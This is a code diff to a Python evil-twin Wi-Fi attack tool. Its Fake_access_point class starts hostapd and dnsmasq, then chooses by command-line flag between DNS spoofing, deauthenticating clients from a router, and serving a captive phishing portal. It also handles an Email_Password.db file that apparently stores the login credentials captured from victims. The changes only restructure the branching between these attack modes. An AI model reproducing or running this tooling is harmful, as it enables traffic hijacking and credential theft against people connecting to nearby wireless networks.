@@ -257,31 +257,40 @@ class Fake_access_point:
                     group1  = "chown "+ user_name+ ":"+user_name +" "+  Curent_dir+"/Email_Password.db" 
                     os.system(group1)
           try:   
-             subprocess.call(["chmod +x "+Curent_dir+"/Snake_Package/Host_apd.py"],shell=True)
-             order = Curent_dir+"/Snake_Package/Host_apd.py"             
-             command_proc = ' gnome-terminal --geometry 95x30+40+40  -e ' +'"' + order  +'"'                  
-             call_termminal = subprocess.call(command_proc,shell=True,stderr=subprocess.PIPE)              
+              subprocess.call(["chmod +x "+Curent_dir+"/Snake_Package/Host_apd.py"],shell=True)
+              order = Curent_dir+"/Snake_Package/Host_apd.py"             
+              command_proc = ' gnome-terminal --geometry 95x30+40+40  -e ' +'"' + order  +'"'                  
+              call_termminal = subprocess.call(command_proc,shell=True,stderr=subprocess.PIPE)              
      
-             order2 = "dnsmasq -C dnsmasq.conf -d"
-             command_proc2 = ' gnome-terminal --geometry 95x30+40+40  -e ' +'"' + order2 +'"'    
-             print(command_proc2)      
-             call_termminal = subprocess.call(command_proc2,shell=True,stderr=subprocess.PIPE)
-             if self.args.dns and not self.args.Deauth\
-             or not self.args.Portal :
-                from Snake_Package.dns_spoofing import DNS_Spoofing
-                run = DNS_Spoofing()
-             if self.args.Deauth :                                
-                 run = Deauth_Router()  
-             else:
-                  pass 
-             if self.args.Portal:
-                from Snake_Package.Captive_Portal import Captive_Portal
-                try:
-                   shutil.copytree(Curent_dir+'/Captive_Portal/', '/var/www/Captive_Portal')
-                except FileExistsError :
-                     time.sleep(.0001)
-                run = Captive_Portal()  
-                Set_Log()
+              order2 = "dnsmasq -C dnsmasq.conf -d"
+              command_proc2 = ' gnome-terminal --geometry 95x30+40+40  -e ' +'"' + order2 +'"'         
+              call_termminal = subprocess.call(command_proc2,shell=True,stderr=subprocess.PIPE)
+              if self.args.dns and not self.args.Deauth\
+              and  not self.args.Portal :
+                 from Snake_Package.dns_spoofing import DNS_Spoofing
+                 run = DNS_Spoofing()
+              elif self.args.Deauth\
+              and not self.args.dns and not self.args.Portal :                                
+                  run = Deauth_Router()  
+              elif self.args.Deauth and self.args.dns\
+              and not self.args.Portal :
+                    from Snake_Package.dns_spoofing import DNS_Spoofing
+                    run = Deauth_Router()  
+                    run = DNS_Spoofing()  
+              elif self.args.Portal\
+              and not self.args.dns and not self.args.Deauth:
+                 from Snake_Package.Captive_Portal import Captive_Portal
+                 try:
+                    shutil.copytree(Curent_dir+'/Captive_Portal/', '/var/www/Captive_Portal')
+                 except FileExistsError :
+                      time.sleep(.0001)
+                 run = Captive_Portal()  
+                 Set_Log()
+              else:
+                   if not self.args.dns and not self.args.Deauth\
+                   and not self.args.Portal:
+                      print("[+] access point start ")
+                      exit()
           except KeyboardInterrupt :
                   Command  = [
                                "sudo airmon-ng stop wlan0mon",
